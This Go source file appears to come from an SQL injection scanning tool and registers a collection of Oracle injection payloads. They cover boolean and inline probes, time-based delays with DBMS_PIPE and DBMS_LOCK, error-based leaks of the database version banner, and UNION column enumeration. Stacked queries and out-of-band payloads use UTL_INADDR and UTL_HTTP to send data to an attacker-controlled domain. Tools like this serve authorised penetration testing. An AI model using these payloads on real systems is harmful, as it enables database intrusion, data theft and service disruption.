package dbms

func init() {
	register(&Payloads{
		Name: Oracle,
		Boolean: []BoolPair{
			{True: "{orig} AND 1=1", False: "{orig} AND 1=2"},
			{True: "{orig}' AND '1'='1", False: "{orig}' AND '1'='2"},
			{True: "{orig}' AND 'a'='a'", False: "{orig}' AND 'a'='b'"},
			{True: "({orig}) AND 1=1", False: "({orig}) AND 1=2"},
			{True: "{orig} AND (SELECT 1 FROM dual)=1", False: "{orig} AND (SELECT 1 FROM dual)=2"},
		},
		Inline: []BoolPair{
			{True: "{orig} AND (SELECT 8634 FROM DUAL)=8634", False: "{orig} AND (SELECT 8634 FROM DUAL)=8635"},
			{True: "{orig}' AND (SELECT 8634 FROM DUAL)=8634-- -", False: "{orig}' AND (SELECT 8634 FROM DUAL)=8635-- -"},
		},
		Time: []TimeTpl{
			{Payload: "{orig} AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) FROM DUAL) IS NOT NULL-- -", Risk: 1},
			{Payload: "{orig}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) FROM DUAL) IS NOT NULL-- -", Risk: 1},
			{Payload: "{orig} AND DBMS_LOCK.SLEEP({delay}) IS NULL-- -", Risk: 2},
			{Payload: "{orig} AND 1=(SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3,all_users t4) ELSE 1 END FROM dual)-- -", Risk: 3},
		},
		Error: []string{
			"{orig} AND (SELECT 1/(0) FROM DUAL)-- -",
			"{orig}' AND (SELECT 1/(0) FROM DUAL)-- -",
			"{orig} AND (SELECT 1/(0) FROM DUAL) IS NOT NULL-- -",
			"{orig} AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)) FROM DUAL) IS NOT NULL-- -",
			"{orig} AND (SELECT CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) FROM DUAL) IS NOT NULL-- -",
			"{orig}'",
		},
		Union: UnionTemplates{
			OrderBy: []string{
				"{orig} ORDER BY {n}-- -",
			},
			UnionSelect: []string{
				"{orig} UNION ALL SELECT {cols} FROM DUAL-- -",
				"{orig} UNION SELECT {cols} FROM DUAL-- -",
			},
		},
		Stacked: []TimeTpl{
			{Payload: "{orig}';BEGIN DBMS_LOCK.SLEEP({delay});END;-- -", Risk: 3},
		},
		OOB: []string{
			"{orig} AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{domain}') FROM DUAL) IS NOT NULL-- -",
			"{orig}';SELECT UTL_HTTP.REQUEST('http://{domain}/'||'{unc}') FROM DUAL;-- -",
		},
		StackedOK: true,
	})
}
